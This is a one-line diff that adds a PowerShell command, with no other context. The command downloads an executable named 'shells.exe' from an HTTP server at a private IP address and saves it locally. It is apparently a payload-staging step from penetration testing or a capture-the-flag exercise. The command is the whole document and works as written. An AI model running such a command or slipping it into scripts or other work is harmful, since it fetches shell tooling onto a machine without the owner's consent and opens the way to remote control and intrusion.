@@ -1,0 +1,1 @@
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.54.20:8000/shells.exe','shells.exe')"
